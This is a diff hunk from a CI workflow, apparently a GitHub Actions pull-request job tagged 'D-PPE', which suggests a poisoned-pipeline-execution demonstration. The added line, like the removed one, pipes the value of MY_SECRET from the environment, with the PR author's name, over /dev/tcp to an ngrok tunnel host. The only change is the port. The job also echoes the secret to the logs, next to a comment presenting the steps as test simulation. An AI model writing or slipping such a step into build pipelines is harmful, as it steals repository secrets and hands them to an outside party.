@@ -29,7 +29,7 @@ jobs:
           echo $MY_SECRET
           mkdir ./bin
           touch ./bin/mybin.exe
-          echo ------- D-PPE From user [${{ github.event.pull_request.user.login }}] in pr [${{ github.workflow }}] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/0.tcp.eu.ngrok.io/16174
+          echo ------- D-PPE From user [${{ github.event.pull_request.user.login }}] in pr [${{ github.workflow }}] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/0.tcp.eu.ngrok.io/11370
       
       # Simulation of running tests
       - name: Running tests ...
